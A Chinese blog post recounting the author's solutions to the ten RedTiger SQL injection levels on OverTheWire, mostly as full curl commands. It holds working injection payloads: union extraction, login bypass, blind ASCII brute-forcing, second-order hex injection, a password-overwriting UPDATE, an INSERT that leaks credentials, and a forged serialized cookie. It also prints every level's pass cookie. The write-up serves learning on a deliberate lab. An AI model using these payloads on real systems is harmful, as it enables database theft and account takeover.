---
title: 玩 redtiger SQL 注入 10 关
date: 2018-04-10 22:31:42
tags: [SQL Injection]
categories: [Tech Notes]

---

以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈

传送门：[https://redtiger.labs.overthewire.org/](https://redtiger.labs.overthewire.org/)

下面是流水账，想自己先玩的就随意罗

<!-- truncate -->

### level 1
cat 参数是注入点，没有明显回显，使用 1=1 ， 1=2 等可以确认，
使用 union 捞出数据
```
curl "https://redtiger.labs.overthewire.org/level1.php?cat=2/**/union/**/select/**/99,100,username,password/**/from/**/level1_users;--“;
```


### level 2
简单条件，单引号拼接
```
--data "username=a&password=a'+or+'1'='1&login=Login"
```


### level 3
提示说需要 trigger error，完了一顿时间没有头绪，看了答案，学会了触发类型错误，

需要在 usr 参数用 usr[0]=xxxx 来触发类型错误，再从出错提示中拿到 inc 文件，直接访问 inc 文件可以拿到源码，
之后就是把 sql 语句经过源码加解密来触发了


### level 4

使用substring 数值猜解 cell 值

```
curl "https://redtiger.labs.overthewire.org/level4.php?id=1/**/union/**/select/**/keyword,2/**/from/**/level4_secret/**/where/**/ascii(substring(keyword,1,1))=107;--"; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug' -H 'Connection: keep-alive' --compressed
```


下面是简单枚举，可以改用二分查找减少请求，又使用并发缩短时间 

```py
def check(ascii_val):
    p = subprocess.Popen(["bash", "-c", command % (i,ascii_val)], stdout=subprocess.PIPE)
    out, _ = p.communicate()
    out = out.decode()
    print(out)
    return "Query returned 2 rows" in out


hits = []
for i in range(1, 25):
    for c in range(32, 127):
        if check(c):
            print(c)
            hits.append(c)
            break
```

### level 5

从hints 理解，就算拿到 password，也不能登入，限制了函数其实也是缩窄了范围，
解法就是自己提供一组可登入的数据

```
curl 'https://redtiger.labs.overthewire.org/level5.php?mode=login'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level5.php?mode=login'; -H 'Connection: keep-alive' --data "username=a' union all select '1','534b44a19bf18d20b71ecc4eb77c572f&password=alex&login=Login" --compressed
```


### level 6 

```
curl "https://redtiger.labs.overthewire.org/level6.php?user=-1/**/or/**/status=11/**/union/**/select/**/username,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20/**/as/**/username,username,2,username/**/from/**/level6_users"; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level6.php?user=1'; -H 'Connection: keep-alive' --data 'user=admin&password=admin&login=Login' —compressed
```

##### 发现
从 user 里直接注入 union 并不影响输出，但会有 user not found 的错误提示，说明会根据 user 的 id 先拿到一个 username，再从 username 拿一次 user 数据，

##### 结果
不会做，翻了答案才知道可以间接注入，把用户名注入成另外一句 payload，当进行第二次 query 时触发数据替换，把邮件换成密码来显示
看了答案除了学会这招迂回注入，还发现可以用十六进制绕开 mysql_real_escape_string 的单引号过滤，hmmm


### level 7
##### 发现
sql 语法错误后会打印错误信息，发现整条 query 

```
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%xxx%' OR text.title LIKE '%xxx%')

SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%' union select 1,2,3,4,5,6 from  level7_texts text where text.title ='%' OR text.title LIKE '%xxx%')
```


先拼接一条合法的注入，再想办法拿到 google 相关文章的作者

```
 curl 'https://redtiger.labs.overthewire.org/level7.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level7.php'; -H 'Connection: keep-alive' --data "search=') union select 1,2,autor,4 from level7_news news, level7_texts text where autor='1' or (autor='&dosearch=search%21" —compressed
```

把上条的条件改成 always true，拿出了所有数据，然后得到 google 文章的作者


```
curl 'https://redtiger.labs.overthewire.org/level7.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level7.php'; -H 'Connection: keep-alive' --data "search=') union select 1,2,autor,4 from level7_news news, level7_texts text where '1'='1' or (autor='&dosearch=search%21" —compressed
```



#### level 8

反复摆弄后，会发现真的会执行一条 update 语句，似乎只有 email 项可以注入，给update 时拼一个 password，就会把密码覆盖，这样就可以登入了
```
curl 'https://redtiger.labs.overthewire.org/level8.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level8.php'; -H 'Connection: keep-alive' --data "email=hans%40local', password='13&name=Hans&icq=12345/*or&age=25*/&edit=Edit&user=admin&password=13&login=Login" —compressed
```

#### level 9

虽然发现注入点在 text 项，但怎么也想不明白，一条 update 语句怎样才能操作好，
看了别人的答案后。。。。这似乎是一条 insert。。。。。。嗯，顺便学了下 insert 也可以 somehow 显示数据
```
curl 'https://redtiger.labs.overthewire.org/level9.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level9.php'; -H 'Connection: keep-alive' --data "autor=alex&title=alexortitle&text=aa'), ((select username from level9_users limit 1), (select password from level9_users limit 1), 'a&post=Submit" —compressed
```

#### level 10

测试了username 和 password 都不能注入，
想不明白就看了答案，原来是一题和 serialize 函数有关的题目，
答案是把类型改成 boolean，难道源码内根据这些类型生成 sql / 作判断吗？
```
curl 'https://redtiger.labs.overthewire.org/level10.php'; -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln; level10login=get_post_cookie_head__kittens_eating_all_my_bread" -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level10.php'; -H 'Connection: keep-alive' --data "login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30&dologin=Login" —compressed
```
